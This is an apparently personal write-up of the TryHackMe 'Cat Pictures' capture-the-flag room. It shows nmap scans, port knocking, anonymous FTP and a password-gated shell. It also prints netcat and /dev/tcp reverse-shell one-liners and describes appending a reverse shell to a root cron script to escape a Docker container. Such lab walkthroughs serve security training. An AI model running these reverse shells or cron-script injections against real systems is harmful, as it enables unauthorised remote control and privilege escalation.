## 🐈Cat Pictures
https://tryhackme.com/room/catpictures

## 🐈Enum
```
nmap -Pn -sS -sC -sV ip.thm -p 21,22,2375,8080 -A

Nmap scan report for ip.thm (10.10.103.243)
Host is up (0.44s latency).

PORT     STATE    SERVICE    VERSION
21/tcp   filtered ftp
22/tcp   open     ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
|   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
|_  256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (ED25519)
2375/tcp filtered docker
8080/tcp filtered http-proxy

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
![image](https://user-images.githubusercontent.com/6504854/194803950-c48775f2-f856-4554-8b27-dbab00aeea3f.png)

🐱 what is mugic numbers?

https://wiki.archlinux.org/title/Port_knocking

https://wiki.archlinux.jp/index.php/%E3%83%9D%E3%83%BC%E3%83%88%E3%83%8E%E3%83%83%E3%82%AD%E3%83%B3%E3%82%B0

```
nmap -Pn --host-timeout 100 --max-retries 0 -p 1111 ip.thm

PORT     STATE  SERVICE
1111/tcp closed lmsocialserver

nmap -Pn --host-timeout 100 --max-retries 0 -p 2222 ip.thm

PORT     STATE  SERVICE
2222/tcp closed EtherNetIP-1

nmap -Pn --host-timeout 100 --max-retries 0 -p 3333 ip.thm

PORT     STATE  SERVICE
3333/tcp closed dec-notes

nmap -Pn --host-timeout 100 --max-retries 0 -p 4444 ip.thm

PORT     STATE  SERVICE
4444/tcp closed krb524
```
🐱 I knoked all numbers politely, but all closed. 🤔

```
ftp ip.thm
ftp: Can't connect to `10.10.63.130:21': 接続を拒否されました
ftp: Can't connect to `ip.thm:ftp'
ftp> exit
                                                                                                  
nc ip.thm 1111                                             
ip.thm [10.10.63.130] 1111 (?) : Connection refused
                                                                                                  
nc ip.thm 2222
ip.thm [10.10.63.130] 2222 (?) : Connection refused
                                                                                                  
nc ip.thm 3333
ip.thm [10.10.63.130] 3333 (?) : Connection refused
                                                                                                  
nc ip.thm 4444
ip.thm [10.10.63.130] 4444 (?) : Connection refused
                                                                                                  
ftp ip.thm    
Connected to ip.thm.
220 (vsFTPd 3.0.3)
Name (ip.thm:kali): 
```
👀 I could conect ftp. knock meams nc? All ringht 😄

```
ftp ip.thm    
Connected to ip.thm.
220 (vsFTPd 3.0.3)
Name (ip.thm:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||56622|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           162 Apr 02  2021 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||64773|)
150 Opening BINARY mode data connection for note.txt (162 bytes).
100% |*****************************************************|   162       43.64 KiB/s    00:00 ETA
226 Transfer complete.
162 bytes received in 00:00 (0.28 KiB/s)
ftp> exit
221 Goodbye.
```

```
cat note.txt    
In case I forget my password, I'm leaving a pointer to the internal shell service on the server.

Connect to port 4420, the password is s***********cat.
- catlover
```

```
nc ip.thm 4420
INTERNAL SHELL SERVICE
please note: cd commands do not work at the moment, the developers are fixing it at the moment.
do not use ctrl-c
Please enter password:

Password accepted

ls
bin
etc
home
lib
lib64
opt
tmp
usr
```
🐱 cd command is not available and I use another revers-shell.

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f
```

## 🐈Flag
```
nc -lnvp 4444                                   
listening on [any] 4444 ...

sh: 0: can't access tty; job control turned off
# id
sh: 1: id: not found
# cd home
# ls
catlover
# cd catlover
# ls
runme
# file runme
sh: 6: file: not found
# ls -la 
total 28
drwxr-xr-x 2 0 0  4096 Apr  3  2021 .
drwxr-xr-x 3 0 0  4096 Apr  2  2021 ..
-rwxr-xr-x 1 0 0 18856 Apr  3  2021 runme

# ./runme
Please enter yout password: test
Access Denied
```

![image](https://user-images.githubusercontent.com/6504854/194808674-dc538a93-4db1-4644-b43a-230e7dafc5dd.png)

🐱 strings command couldn't use so used cat command and found hardcorded password.

```
# ./runme
Please enter yout password: r*******
Welcome, catlover! SSH key transfer queued! 
# cd /home
# ls -la
total 12
drwxr-xr-x  3    0    0 4096 Apr  2  2021 .
drwxr-xr-x 10 1001 1001 4096 Apr  3  2021 ..
drwxr-xr-x  2    0    0 4096 Apr  3  2021 catlover
# cd catlover
# ls -la
total 32
drwxr-xr-x 2 0 0  4096 Oct 10 06:30 .
drwxr-xr-x 3 0 0  4096 Apr  2  2021 ..
-rw-r--r-- 1 0 0  1675 Oct 10 06:30 id_rsa
-rwxr-xr-x 1 0 0 18856 Apr  3  2021 runme

# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAmI1dCzfMF4y+TG3QcyaN3B7pLVMzPqQ1fSQ2J9jKzYxWArW5
~~~~~
O4fvFElowV6MXVEMY/04fdnSWavh0D+IkyGRcY5myFHyhWvmFcQ=
-----END RSA PRIVATE KEY-----
# 
```

🐱 Copy+Paste local machine and chmod 600 and ssh.

```
ssh -i id_rsa catlover@ip.thm

Last login: Fri Jun  4 14:40:35 2021
root@7546fa2336d6:/# id
uid=0(root) gid=0(root) groups=0(root)
root@7546fa2336d6:/# cd /root
root@7546fa2336d6:/root# ls
flag.txt
root@7546fa2336d6:/root# cat flag.txt
7c**************************************9
```

🐱 Where is the last flag 🤔
```
root@7546fa2336d6:/root# history
    1  exit
    2  exit
    3  exit
    4  exit
    5  exit
    6  exit
    7  exit
    8  ip a
    9  ifconfig
   10  apt install ifconfig
   11  ip
   12  exit
   13  nano /opt/clean/clean.sh 
   14  ping 192.168.4.20
   15  apt install ping
   16  apt update
   17  apt install ping
   18  apt install iptuils-ping
   19  apt install iputils-ping
   20  exit
   21  ls
   22  cat /opt/clean/clean.sh 
   23  nano /opt/clean/clean.sh 
   24  clear
   25  cat /etc/crontab
   26  ls -alt /
   27  cat /post-init.sh 
   28  cat /opt/clean/clean.sh 
   29  bash -i >&/dev/tcp/192.168.4.20/4444 <&1
   30  nano /opt/clean/clean.sh 
   31  nano /opt/clean/clean.sh 
   32  nano /opt/clean/clean.sh 
   33  nano /opt/clean/clean.sh 
   34  cat /var/log/dpkg.log 
   35  nano /opt/clean/clean.sh 
   36  nano /opt/clean/clean.sh 
   37  exit
   38  exit
   39  exit
   40  id
   41  cd /root
   42  ls
   43  cat flag.txt
   44  find / -group root 2>/dev/null
   45  find / -user root 2>/dev/null
   46  history
```
🐱 What is clean.sh ?

```
ls -la /opt/clean/clean.sh
-rw-r--r-- 1 root root 27 May  1  2021 /opt/clean/clean.sh

root@7546fa2336d6:/root# cat /opt/clean/clean.sh
#!/bin/bash

rm -rf /tmp/*
root@7546fa2336d6:/root# echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 8888 >/tmp/f' >> /opt/clean/clean.sh
root@7546fa2336d6:/root# cat /opt/clean/clean.sh
#!/bin/bash

rm -rf /tmp/*
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 8888 >/tmp/f

root@7546fa2336d6:/root# /opt/clean/clean.sh
bash: /opt/clean/clean.sh: Permission denied

root@7546fa2336d6:/root# chmod +x /opt/clean/clean.sh
root@7546fa2336d6:/root# /opt/clean/clean.sh
rm: cannot remove '/tmp/f': No such file or directory
/opt/clean/clean.sh: line 4: nc: command not found
root@7546fa2336d6:/root# 
```

```
nc -lnvp 8888
listening on [any] 8888 ...

sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# ls -la
total 60
drwx------  8 root root 4096 Apr  2  2021 .
drwxr-xr-x 23 root root 4096 Apr 30  2021 ..
lrwxrwxrwx  1 root root    9 Mar 24  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  3 root root 4096 Mar 31  2021 .cache
drwx------  3 root root 4096 Mar 24  2021 .config
drwxr-xr-x  2 root root 4096 Apr  2  2021 firewall
drwx------  3 root root 4096 Mar 24  2021 .gnupg
-rw-------  1 root root   28 Apr  2  2021 .lesshst
drwxr-xr-x  3 root root 4096 Mar 24  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root   45 Mar 31  2021 .python_history
-rw-r--r--  1 root root   73 Mar 25  2021 root.txt
-rw-r--r--  1 root root   66 Mar 25  2021 .selected_editor
drwx------  2 root root 4096 Mar 25  2021 .ssh
-rw-r--r--  1 root root  168 Apr  2  2021 .wget-hsts
# cat root.txt
Congrats!!!
Here is your flag:

4a*************************************
#
```
😸 ㊗️ Congratrations Happy hackig! ㊗️ 😸
